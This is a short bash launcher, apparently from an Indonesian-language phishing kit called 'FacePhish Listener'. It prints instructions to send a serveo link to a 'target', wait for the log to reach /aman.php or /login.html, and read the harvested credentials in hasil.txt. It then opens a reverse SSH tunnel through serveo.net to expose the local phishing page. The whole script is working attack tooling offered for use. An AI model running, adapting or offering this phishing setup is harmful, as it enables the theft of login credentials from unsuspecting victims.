clear                                                               
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo                                                 
pur='\033[35;1m' #purple                                            
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah                                              
pu='\033[37;1m' #putih                                              
ku='\033[33;1m' #kuning
echo $i" Welcome to FacePhish Listener"
echo $i" TUTORIAL"
echo $pur"___________________________________"
echo $ku" 1.copy link serveo dibwah dan kirim ke target"
echo $ku" 2.tunggu hingga log berjalan sampai /aman.php atau /login.html"
echo $ku" 4.silahkan buka hasil.txt di direktori Phisingnya"
echo $ku" 5.buka menggunakan perintah" $pur"nano hasil.txt"
echo $pur"___________________________________"
ssh -R 80:localhost:8080 serveo.net
